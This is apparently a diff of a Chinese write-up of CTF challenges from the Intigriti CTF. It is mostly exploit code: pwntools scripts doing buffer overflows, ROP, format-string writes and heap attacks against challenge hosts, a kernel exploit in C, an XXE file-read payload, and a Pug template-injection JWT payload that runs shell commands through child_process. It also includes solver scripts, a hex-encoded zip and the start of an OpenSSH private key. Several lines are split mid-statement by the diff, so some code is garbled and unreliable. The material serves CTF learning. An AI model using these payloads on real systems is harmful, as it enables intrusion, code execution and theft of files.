@@ -22,7 +22,7 @@ ChaMd5 Venom 招收大佬入圈
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -37,7 +37,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -55,31 +55,26 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('riggedslot2.ctf.intigriti.io',1337)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rl("Enter your name:")
 payload=b'a'*20+p32(0x14684d)+p32(1)
-#bug()
+    #bug()
 sl(payload)
 
 rl("per spin): ")
 sl(str(1))
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
@@ -98,7 +93,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -116,36 +111,31 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc6_2.23-0ubuntu11.3_amd64.so')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('retro2win.ctf.intigriti.io',1338)
-#p = process('./pwn')
+    #p = process('./pwn')
 rdi=0x00000000004009b3
 main=0x4008B7
 rl("Select an option:")
 sl(str(1337))
 rl("Enter your cheatcode:")
 payload=b'x00'*(0x10)+p64(0x602070+0x500)+p64(0x40076A)
-#bug()
+    #bug()
 sl(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -160,7 +150,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -178,17 +168,17 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('floormatsale.ctf.intigriti.io',1339)
-#p = process('./pwn')
+    #p = process('./pwn')
 addr=0x40408C
 rl("nEnter your choice:")
 sl(str(6))
@@ -198,15 +188,10 @@ payload=fmtstr_payload(10,{addr:1}) 
 sl(payload)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -221,7 +206,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -239,17 +224,17 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('uap.ctf.intigriti.io',1340)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add():
         rl("5. Exit")
@@ -276,21 +261,16 @@ add()
 
 free(1)
 add1(b'a'*(0x10)+p64(0x400836)*2)
-#bug()
+    #bug()
 show(1)
 
-#bug()
+    #bug()
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -305,7 +285,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -323,17 +303,17 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('notepad.ctf.intigriti.io',1341)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rl(b'0x')
 pie_base=int(p.recv(12),16)-0x119a
@@ -378,15 +358,10 @@ rl("> ")
 sl(str(5))
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -401,7 +376,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -419,17 +394,17 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote('notepad2.ctf.intigriti.io',1342)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 def add(i,content):
         rl("> ")
@@ -487,12 +462,7 @@ add(6,b'/bin/shx00')
 free(6)
 
 inter()
-```
-
-
-
-```
-#include "Kernel.h"
+    #include "Kernel.h"
 
 char *buf, key[0x30];
 int ko_fd;
@@ -546,11 +516,6 @@ int main() {
     write(ko_fd, ibuf, 0x1a0);
     return 0;
 }
-```
-
-
-
-```
 const validUsername = "agent_1337";
 const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";
 
@@ -560,36 +525,16 @@ function getCredentials() {
         passwordHash: validPasswordHash,
     };
 }
-```
-
-
-
-```
 X-Biocorp-Vpn: 80.187.61.102
-```
-
-
-
-```
 <!DOCTYPE ent [
 <!ENTITY ent SYSTEM "file:///flag.txt">
  ]>
 <reactor>
     <temperature>&ent;</temperature>
-    <pressure>200</pressure>
+    200
     <control_rods>50%</control_rods>
 </reactor>
-```
-
-
-
-```
 pug模板注入但是没法伪造jwt，不知道公钥有什么用
-```
-
-
-
-```
 function verifyJWT(token) {
     return new Promise((resolve, reject) => {
         if (!token || typeof token !== "string" || token.split(".").length !== 3) {
@@ -609,11 +554,6 @@ function verifyJWT(token) {
         });
     });
 }
-```
-
-
-
-```
 const crypto = require("crypto");
 const jwt = require("json-web-token");
 
@@ -644,7 +584,8 @@ function signJWT(payload) {
 // console.log(publicKey.export({ format: "pem", type: "spki" }));
 const publicKeyContent =publicKey.export({ format: "pem", type: "spki" })
 
-const token = signJWT({ username: '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("cat /flag_Gx4wVbEc1fxN9ztM.txt").toString();return sh;}()}' });
+const token = signJWT({ username: '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("cat /flag_Gx4wVbEc1fxN9ztM.txt").toString();
+return sh;}()}' });
 console.log(token.value);
 
 const https = require('https')
@@ -671,13 +612,9 @@ console.error(error)
 })
 
 req.end()
-```
-
-
-
-```
 def otp(p, k):
-    k_r = (k * ((len(p) // len(k)) + 1))[:len(p)]
+    k_r = (k * ((len(p) // len(k)) + 1))[:
+len(p)]
     return bytes([p ^ k for p, k in zip(p, k_r)])
     
 def reverse_check_cat_box(processed_text, cat_state):
@@ -704,15 +641,10 @@ print(key)
 flag = otp(c1, key)
 print(flag)
 
-#b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
-#b'x02&WXnx0b(x07x19x17x04x14x1b+Y2Yr3 %(x03x023x0e8#7x0fx00x16x03/"*Ux0f&x0e1x06x17(x19$x07,x12x19x188)-x086x16x19x15%&1x07PVx0408.'x03P(*n6x04x19x059+nXx16+8x19Xx07x06.x161x13+V$R"Wx06Vx04Ux0e+x03x08RRV7x07)T#x00.)x15x10x11x15&2Q#/x066x10)x06;6*x0bXx0ex04S1x166n*&tx17x06x18x19x118Px0ct%/x0c'
-#b'cG69kjIfxveuzJ8S8lRADIbcRoYBVnawbNCK4nGoPgvIxEfMsxyYHLiWwxtDGPf17eQYOFb1IKkWexdXJk9wJYx9fgOwPrJ7E3C6g7e4oJbi337VfH5BaOHtqptGS0BNgWqHgZWKj9oe2PwWkKGhvgyxpY1mhDNm'
-#b"Schrodinger's cat in a quantum bind, INTIGRITI{d34d_0r_4l1v3} hidden, hard to find. Is it alive, or has fate been spun? In superposition, the game's never done."
-```
-
-
-
-```
+    #b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+    #b'x02&WXnx0b(x07x19x17x04x14x1b+Y2Yr3 %(x03x023x0e8#7x0fx00x16x03/"*Ux0f&x0e1x06x17(x19$x07,x12x19x188)-x086x16x19x15%&1x07PVx0408.'x03P(*n6x04x19x059+nXx16+8x19Xx07x06.x161x13+V$R"Wx06Vx04Ux0e+x03x08RRV7x07)T#x00.)x15x10x11x15&2Q#/x066x10)x06;6*x0bXx0ex04S1x166n*&tx17x06x18x19x118Px0ct%/x0c'
+    #b'cG69kjIfxveuzJ8S8lRADIbcRoYBVnawbNCK4nGoPgvIxEfMsxyYHLiWwxtDGPf17eQYOFb1IKkWexdXJk9wJYx9fgOwPrJ7E3C6g7e4oJbi337VfH5BaOHtqptGS0BNgWqHgZWKj9oe2PwWkKGhvgyxpY1mhDNm'
+    #b"Schrodinger's cat in a quantum bind, INTIGRITI{d34d_0r_4l1v3} hidden, hard to find. Is it alive, or has fate been spun? In superposition, the game's never done."
 data=[  73, 78, 84, 73, 71, 82, 73, 84, 73, 49, 
   51, 51, 55, 117, 112, 35]
 
@@ -722,11 +654,6 @@ table=[  7, 125, 34, 122, 21, 21, 121, 58, 39, 113, 
 for i in range(len(data)):
     print(chr(data[i]^table[i]),end='')
 #N3v3RG0nn@6u3$$!
-```
-
-
-
-```
 table=[117,94,82,85,0,73,97,119,6,91,5,124,7,102,2,2,93,97,82,70,122,7,85,115,80,70,2,93,93,79]
 key=[51,50]
 for i in range(len(table)):
@@ -743,17 +670,7 @@ bbqqq=[  0x7E, 0x54, 0x59, 0x5F, 0x09, 0x43, 0x4B, 0x0F, 0x4A, 0x5D,�
 
 for i in range(len(bbqqq)):
     print(chr(bbqqq[i]^0x38),end='')
-```
-
-
-
-```
 SuPeRsEcUrEPaSsWoRd123x00111111111111111111111
-```
-
-
-
-```
 from PIL import Image, ImageDraw
 from itertools import permutations
 import subprocess
@@ -811,11 +728,6 @@ for i in range(4):
 
 reconstructed_image.save("obscured.png")
 print("Reconstructed QR code saved as 'obscured.png'")
-```
-
-
-
-```
 from PIL import Image, ImageDraw
 from itertools import permutations
 
@@ -884,26 +796,67 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 0110100000110000011100000011001101011111011110010011000001110101 h0p3_y0u
 5f336e6a30795f                                                   _3nj0y_
 ZDRfYzdm                                                         d4_c7f
 INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}
-```
-
-
-
-```
-596f756c6c4e65766572476574546869733731393438320a504b0304140009000800d87a5559cd24b3b292070000760d000008001c00666c61672e706e675554090003b8631667ed63166775780b000104e803000004e8030000446c9e90d17d4a3b9a5eea243cd5d135a3b569cef68131b6712c23800708c1e4a94e519a532e48cd4384338c7e969bf6fb2d23575838ab73639cb2c8a2bc7b46d6ee87217309b0c7ed0b3fe321473449149c3a8333774111426699aa53b6a1ed5f8a3357e36fdb0712aeddb664e834f191ebb4a15f1cf9ae83bb5d72d17842ca6d4cb6804602ac16fae4e2c3d802edbf90c2c5a2a658f0efaa6f4b4fccdd1959a43ee13f631f9d9ce96ee7985fde03c148d420794f24a70eaf96fbce91f379d48549667f0f9972c9523123605d49842938316c8a93815b88666f5c3a5bd4fd35591bd906338e22c461d432f2941715e3c8f1be4dab69bcf3e9c600abeb98d3017b07d347cf3d7263fe96b5b169303e476779df51340fd3c4f386aed423550510b0c86ae6357513a1d0fa7b090e13f53c72a2ca02e362ff2b816f29726474df12524290c63fad4dd2e954093410dd32fac03c221861caefc23b6869495c59e1c95c1f2c71b677b1c6d798a1f893dd23f2182232cdf44d3eca31f25b405b25f23bb8a48d2977d4e8124b477a5bc15c81b2b82d6ed8895a02c4ca24ee535b21068dbf7015590bf2780e77d6496e9f275258f1093e49139d3333d186c67bd98de0343a46651ddf30cbd625c0c00f7af44ff0d6da1b15f0f393ba6aaeac95fdb8af25da7280b6aee91437560e2b70107b0b0c978c8357e7c5fbb19fbf39ff6fe033d0b04860335be3536df644e2839a17953568bb9e69bb48714ddf5793d2c4a5d6e6f6ee57ae13d2eb0cd89e2eda16060c9582cae35fb47b196433850c203c27e8d2e84cb441e81030e180e8de28c8e57e56f12fb21973311a11b31834858a21f537f7dad4d3a787cf9c92897cac6b8387e71377dcadc8d98e79c2fdc559565c38f3cb59089e6154af03e034a3c6a275fa6da47825cb4195578cb7b856a2f08a597b51c3e14185aef93b5f9dd4e878e6899ceacf8c27301aa1f8f9b1b72a35707054f8cfc9d1a5f44a87a00001f7db70ee5c200b925fc30146a9b3fa4330297f6ba3d2877f6bd8738b4ec4a0c931b36369737dfde851b91ac986958baabe7a270647cffeeb26a4fea247bb1abf8dc1c303633d4b186fa7b5151cbfc823b16bbe848f0d62c875de118cab8bdef4f8c6d77a96921abc1de30ee2815cc0260fdc2f3edc8eb3da3464daef501b1fe2e0fa43e369571297f7ba96bca559ecc73cd62649edb4a3c79f3458461ebbca237abef853f29d194e73ec590166b1170126d3e5d0eb358d19c931fc81bbcf273a73a3a301b914ad036ccb19527de52965b5734db6a6a030cb501a9a22ddb0e47d40de7106770104e0c49a18d0a5c2ade5e368dcb483c38898f6285ac1b4e2969facd80d9c98020beaac3e9d319899141e087497eaf510205d03c15f1dd090a657336547091d262eef0e3df4e622a325558d346ffc67f921e4d8aeb8f6fb39df228111ab66c83cde0ecd6a3f1737bd40fd8cf3495e24e1c7311a2f4babef4df483da72808ba1c50494096fa0d2effd4b8eee8182e67c5b4efa19fb24c629585e67dc80580099c329ad27fde7a7487686651d32195d9bf7480db079bac1c5ac02b4ad4e71cb915e222e8faaef1c6759bd8f1fd0ccc436e9c5ebae67e0e9b8e046dd8a40d043c3809f2b56a242e64bac276a1631d79bbb35d22a0097e917bdb8fae698041e3acfa628e65742ab74baea411093985e836c490bf775866efe0af2a1595c3f3af647818701077f686fe96900a9bfeca3efd95b9d6e43d44d15216673f9ad80cdaa7eabf5ff67c0f6276c62df1100a1ea7d7cc7df45d30d128c26da12c72382a69acd151dc0651bf1021f070267f545ff8e1629d377ba3f1c883fbf9be2a8c46aeb6175174488f489cc9e476a7d6a8f012b867f79476326e13f9f5c24952240e7190ced92caa6f05ccc972dea8867bb2b11c70e7a0f7d0b29fe98f9f4bc66c7af70eef9be28f7a8ddd7e3d7095ca105c5c2a9b5f0112dd1a8cce4d5e4d6cf108f198f85b260ecd37a372e6d6d72d4755d2473ff29152a7e8fd4b699b24714258f111958264e7b0b7c5c8c25645564fc5e10c2a91cc6a3a5212af82139277c03f4d3df76676f3d8d35f87765590a1047f22f9b6d30bff6044ce090c35d449a36d14c7d4fb1b9ced3a08100eb4422f1b7f699a5242be355768bec3716c285f9da3273ad06e802f5e89771264cf875b0aaf23b91b1a0523287f8745fdb7e8663671e10b8d5efc521e91023abdce7b009a7b30d54914d358043cc1dfa892db57aa927503a1132567e298a6296ecdd167c41282509bd02cff7bd404d030e1397ac38689803d17bac9d585869119afc1a28137887dae7e921cac167abef0b9511925e4071cc1a1bd0c871603e3a6e0ed3c23ff95089622cc104b9b61d03ae4fd33af9f0fb16b92553ba1b835a445fc956307c9c4c49b6453e2c056c748111a05368de06982d86219e2f63585d1af8557e2820ea5a19285d74741e8e4f6e1249a6a6744bf2d0f0de846c24b1a070d23f6fe1bfce93a0dda7074eb38b4262f3652118c6a4c57f46807250ea938565d0a70235ef883a5d8edc786b74125e83d85dd69ca780a4a31c85c499ca95c31cdd9bf6ecb81668a5bd3e864354160014b2981dbd14a87d4f1432e84012b834ef043a19286b9ea2cba547b3193d73ddc727eddd78ceda9a306be60790389d799affc586e86ee7b601da36f42a7a290bea27c174a0993d0901d00f504b0708cd24b3b292070000760d0000504b01021e03140009000800d87a5559cd24b3b292070000760d0000080018000000000000000000f68100000000666c61672e706e675554050003b863166775780b000104e803000004e8030000504b050600000000010001004e000000e40700000000
-```
-
-
-
-```
+596f756c6c4e65766572476574546869733731393438320a504b0304140009000800d87a5559
+cd24b3b292070000760d000008001c00666c61672e706e675554090003b8631667ed63166775
+780b000104e803000004e8030000446c9e90d17d4a3b9a5eea243cd5d135a3b569cef68131b6
+712c23800708c1e4a94e519a532e48cd4384338c7e969bf6fb2d23575838ab73639cb2c8a2bc
+7b46d6ee87217309b0c7ed0b3fe321473449149c3a8333774111426699aa53b6a1ed5f8a3357
+e36fdb0712aeddb664e834f191ebb4a15f1cf9ae83bb5d72d17842ca6d4cb6804602ac16fae4
+e2c3d802edbf90c2c5a2a658f0efaa6f4b4fccdd1959a43ee13f631f9d9ce96ee7985fde03c1
+48d420794f24a70eaf96fbce91f379d48549667f0f9972c9523123605d49842938316c8a9381
+5b88666f5c3a5bd4fd35591bd906338e22c461d432f2941715e3c8f1be4dab69bcf3e9c600ab
+eb98d3017b07d347cf3d7263fe96b5b169303e476779df51340fd3c4f386aed423550510b0c8
+6ae6357513a1d0fa7b090e13f53c72a2ca02e362ff2b816f29726474df12524290c63fad4dd2
+e954093410dd32fac03c221861caefc23b6869495c59e1c95c1f2c71b677b1c6d798a1f893dd
+23f2182232cdf44d3eca31f25b405b25f23bb8a48d2977d4e8124b477a5bc15c81b2b82d6ed8
+895a02c4ca24ee535b21068dbf7015590bf2780e77d6496e9f275258f1093e49139d3333d186
+c67bd98de0343a46651ddf30cbd625c0c00f7af44ff0d6da1b15f0f393ba6aaeac95fdb8af25
+da7280b6aee91437560e2b70107b0b0c978c8357e7c5fbb19fbf39ff6fe033d0b04860335be3
+536df644e2839a17953568bb9e69bb48714ddf5793d2c4a5d6e6f6ee57ae13d2eb0cd89e2eda
+16060c9582cae35fb47b196433850c203c27e8d2e84cb441e81030e180e8de28c8e57e56f12f
+b21973311a11b31834858a21f537f7dad4d3a787cf9c92897cac6b8387e71377dcadc8d98e79
+c2fdc559565c38f3cb59089e6154af03e034a3c6a275fa6da47825cb4195578cb7b856a2f08a
+597b51c3e14185aef93b5f9dd4e878e6899ceacf8c27301aa1f8f9b1b72a35707054f8cfc9d1
+a5f44a87a00001f7db70ee5c200b925fc30146a9b3fa4330297f6ba3d2877f6bd8738b4ec4a0
+c931b36369737dfde851b91ac986958baabe7a270647cffeeb26a4fea247bb1abf8dc1c30363
+3d4b186fa7b5151cbfc823b16bbe848f0d62c875de118cab8bdef4f8c6d77a96921abc1de30e
+e2815cc0260fdc2f3edc8eb3da3464daef501b1fe2e0fa43e369571297f7ba96bca559ecc73c
+d62649edb4a3c79f3458461ebbca237abef853f29d194e73ec590166b1170126d3e5d0eb358d
+19c931fc81bbcf273a73a3a301b914ad036ccb19527de52965b5734db6a6a030cb501a9a22dd
+b0e47d40de7106770104e0c49a18d0a5c2ade5e368dcb483c38898f6285ac1b4e2969facd80d
+9c98020beaac3e9d319899141e087497eaf510205d03c15f1dd090a657336547091d262eef0e
+3df4e622a325558d346ffc67f921e4d8aeb8f6fb39df228111ab66c83cde0ecd6a3f1737bd40
+fd8cf3495e24e1c7311a2f4babef4df483da72808ba1c50494096fa0d2effd4b8eee8182e67c
+5b4efa19fb24c629585e67dc80580099c329ad27fde7a7487686651d32195d9bf7480db079ba
+c1c5ac02b4ad4e71cb915e222e8faaef1c6759bd8f1fd0ccc436e9c5ebae67e0e9b8e046dd8a
+40d043c3809f2b56a242e64bac276a1631d79bbb35d22a0097e917bdb8fae698041e3acfa628
+e65742ab74baea411093985e836c490bf775866efe0af2a1595c3f3af647818701077f686fe9
+6900a9bfeca3efd95b9d6e43d44d15216673f9ad80cdaa7eabf5ff67c0f6276c62df1100a1ea
+7d7cc7df45d30d128c26da12c72382a69acd151dc0651bf1021f070267f545ff8e1629d377ba
+3f1c883fbf9be2a8c46aeb6175174488f489cc9e476a7d6a8f012b867f79476326e13f9f5c24
+952240e7190ced92caa6f05ccc972dea8867bb2b11c70e7a0f7d0b29fe98f9f4bc66c7af70ee
+f9be28f7a8ddd7e3d7095ca105c5c2a9b5f0112dd1a8cce4d5e4d6cf108f198f85b260ecd37a
+372e6d6d72d4755d2473ff29152a7e8fd4b699b24714258f111958264e7b0b7c5c8c25645564
+fc5e10c2a91cc6a3a5212af82139277c03f4d3df76676f3d8d35f87765590a1047f22f9b6d30
+bff6044ce090c35d449a36d14c7d4fb1b9ced3a08100eb4422f1b7f699a5242be355768bec37
+16c285f9da3273ad06e802f5e89771264cf875b0aaf23b91b1a0523287f8745fdb7e8663671e
+10b8d5efc521e91023abdce7b009a7b30d54914d358043cc1dfa892db57aa927503a1132567e
+298a6296ecdd167c41282509bd02cff7bd404d030e1397ac38689803d17bac9d585869119afc
+1a28137887dae7e921cac167abef0b9511925e4071cc1a1bd0c871603e3a6e0ed3c23ff95089
+622cc104b9b61d03ae4fd33af9f0fb16b92553ba1b835a445fc956307c9c4c49b6453e2c056c
+748111a05368de06982d86219e2f63585d1af8557e2820ea5a19285d74741e8e4f6e1249a6a6
+744bf2d0f0de846c24b1a070d23f6fe1bfce93a0dda7074eb38b4262f3652118c6a4c57f4680
+7250ea938565d0a70235ef883a5d8edc786b74125e83d85dd69ca780a4a31c85c499ca95c31c
+dd9bf6ecb81668a5bd3e864354160014b2981dbd14a87d4f1432e84012b834ef043a19286b9e
+a2cba547b3193d73ddc727eddd78ceda9a306be60790389d799affc586e86ee7b601da36f42a
+7a290bea27c174a0993d0901d00f504b0708cd24b3b292070000760d0000504b01021e031400
+09000800d87a5559cd24b3b292070000760d0000080018000000000000000000f68100000000
+666c61672e706e675554050003b863166775780b000104e803000004e8030000504b05060000
+0000010001004e000000e40700000000
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEA2VMBgH/+tCMWx0KvI93adov6hAIH/7TPBG7Gz9bzRobMO8DsG1IK
